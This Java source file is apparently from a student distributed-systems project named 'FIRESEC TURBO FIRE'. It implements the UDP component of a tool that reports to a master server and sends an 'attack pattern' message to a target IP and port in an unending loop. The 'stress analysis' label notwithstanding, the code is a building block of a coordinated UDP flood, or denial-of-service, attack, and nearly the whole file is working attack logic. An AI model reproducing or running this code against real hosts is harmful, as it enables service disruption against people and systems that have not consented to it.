/**
 * FIRESEC TURBO FIRE
 * A stress network analysis tool.
 * ------------------------------------
 * Written by Lucas Fonseca dos Santos.
 * Copyleft 2018 - Rights not reserved.
 * ------------------------------------
 * 
 * Pratical project for discipline Distributed
 * Systems of Federal Univeristy of Lavras - MG,
 * Brazil.
 * 
 * CONTACT:
 * lucas@lcfcompany.com.br
 * github.com/LucasFonsecaDosSantos
 */
package protocols.interfaces;

import view.GUI;
import utilies.AttackPattern;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

/**
 * @author Lucas Fonseca dos Santos
 * @author Otavio Andrade
 * @version 1.0
 * 
 * This abstract class describes a UserDatagramProtocol (UDP) 
 * that be specialization of Protocol abstract class interface
 * (so it extends protocol interface).
 */
public abstract class UserDatagramProtocolInterface extends Protocol {

    /**
     * Socket connection attribute.
     */
    private DatagramSocket socket;

    /**
     * Packet with data attribute.
     */
    private DatagramPacket packet;

    /**
     * The UserDatagramProtocolInterface object constructor.
     * It receives a attack pattern object, master server IP
     * address end master server port value and sends these parameters
     * to constructor of super class Protocol.
     * 
     * @param attackPattern Attack pattern object.
     * @param masterAddress The master server IP address.
     * @param masterPort The master server port value.
     */
    public UserDatagramProtocolInterface(AttackPattern attackPattern, String masterAddress, int masterPort) {
        super(attackPattern, masterAddress, masterPort);
    }

    /**
     * How the super class Protocol implements interface Runnable, it is a thread
     * task, so this class overwrites the run method.
     * In this method, the message will be writed and sended to target.
     */
    @Override
    public void run() {
        createConnection();
        connect();
        
        //SE DER RUIM AQUI, TEM QUE COLOCAR CONDICAO DE PARADA STOP THREAD
        //while(!Thread.currentThread().isInterrupted() && (this.socket.isConnected() && !this.socket.isClosed())) {
        while(true) {
            writeMessage(getAttackPattern().getMessage());
            try {
                Thread.sleep(getAttackPattern().getAttackRange());
            } catch (InterruptedException ex) {
                GUI.showExceptionLog(ex.toString());
            } catch (Exception e) {
                GUI.showExceptionLog(e.toString());
            }
        }
    }

    /**
     * This method is responsible for creating a new socket
     * connection, instantiating a new datagram udp socket and
     * sending it for target.
     */
    public void createConnection() {
        try {
            this.socket = new DatagramSocket(0);
            this.socket.setSoTimeout(getAttackPattern().getConnectionTimeOut());
        } catch (SocketException se) {
            GUI.showExceptionLog(se.toString());
        } catch (Exception e) {
            GUI.showExceptionLog(e.toString());
        }
    }

    /**
     * This method is responsible for makes the connection
     * by the socket and target server.
     */
    public void connect() {
        setAddress(new InetSocketAddress(getAttackPattern().getIP(), getAttackPattern().getPort()));
        this.packet = new DatagramPacket(new byte[1], 1, getAddress());
    }

    /**
     * This method is responsible for close the socket
     * connection with the target.
     */
    public void closeConnection() {
        if(this.socket != null && !this.socket.isClosed() && this.socket.isBound()) {
            this.socket.close();
        }
    }

    /**
     * The socket attribute state accessor method.
     * 
     * @return DatagramSocket The datagramSocket object.
     */
    public DatagramSocket getSocket() {
        return this.socket;
    }

    /**
     * The socket attribute state modifier method.
     * 
     * @param socket The datagramSocket object.
     */
    public void setSocket(DatagramSocket socket) {
        this.socket = socket;
    }

    /**
     * The Packet attribute state accessor method.
     * 
     * @return DatagramPacket The datagramSocket packet object.
     */
    public DatagramPacket getPacket() {
        return this.packet;
    }

    /**
     * The Packet attribute state modifier method.
     * 
     * @param packet The datagramSocket packet object.
     */
    public void setPacket(DatagramPacket packet) {
        this.packet = packet;
    }
}